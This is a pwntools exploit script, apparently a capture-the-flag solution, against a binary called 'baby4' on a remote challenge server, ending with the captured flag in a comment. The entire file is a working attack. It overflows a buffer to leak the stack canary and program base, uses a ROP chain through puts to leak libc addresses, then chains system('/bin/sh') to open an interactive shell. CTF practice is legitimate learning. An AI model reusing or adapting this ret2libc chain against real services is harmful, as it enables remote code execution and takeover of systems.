from pwn import *


binpath = './baby4'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

elf = ELF(binpath)
libc = elf.libc

gdbscript = '''
pwn
# b *0x555555554c3e
b *0x555555554d06
# b *0x555555554c3e
set $ret_addr=0x7fffffffddc8
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('baby-01.pwn.beer', 10004)


io.recvuntil('<-- ')

payload = 'A' * 0x49 + '\n'
io.send(payload)

io.recvuntil('--> ')
data = io.recvline().rstrip('\n').strip('A')
canary = u64('\x00' + data[:7])

data = data[7:]
addr_old_ebp = u64(data.ljust(8, '\x00'))
addr_prog = u64(data.ljust(8, '\x00')) - 0xd10

print 'canary = {}'.format(hex(canary))
print 'addr_prog = {}'.format(hex(addr_prog))

addr_pop_rdi = addr_prog + 0x0000000000000d73 #  : pop rdi ; ret
addr_pop_rsi_r15 = addr_prog + 0x0000000000000d71 #  : pop rsi ; pop r15 ; ret
addr_ret = addr_prog + 0x00000000000003e0

addr_pivot = addr_prog + 0x202000 + 0x500
payload = 'A' * 0x48 + p64(canary) + p64(addr_pivot)

payload += p64(addr_pop_rdi)
payload += p64(addr_prog + elf.got['puts'])
payload += p64(addr_prog + elf.plt['puts'])
payload += p64(addr_pop_rdi)
payload += p64(addr_prog + elf.got['fclose'])
payload += p64(addr_prog + elf.plt['puts'])
payload += p64(addr_prog + 0xc3e) # middle of main

io.sendline(payload)
io.recvuntil('--> ')
io.recvline()

io.recvuntil('<-- ')
io.sendline('')

data = io.recvline().rstrip()
while 'Warning' in data:
    data = io.recvline().rstrip()
print hexdump(data)
addr_0= u64(data.ljust(8, '\x00')) # puts
print hex(addr_0)

data = io.recvline().rstrip()
while 'Warning' in data:
    data = io.recvline().rstrip()
addr_1 = u64(data.ljust(8, '\x00'))
print hex(addr_1)

addr_libc = addr_0 - libc.symbols['puts']

print 'addr_libc = {}'.format(hex(addr_libc))

payload = 'B' * 0x48 + p64(canary) + p64(addr_pivot + 0x100)
payload += p64(addr_ret)
payload += p64(addr_pop_rdi)
payload += p64(addr_libc + next(libc.search('/bin/sh')))
payload += p64(addr_libc + libc.symbols['system'])

io.sendline(payload)
io.recvuntil('<-- ')

io.sendline('')


io.interactive()


# sctf{un1VEr5aL_gAdg375_FTW}
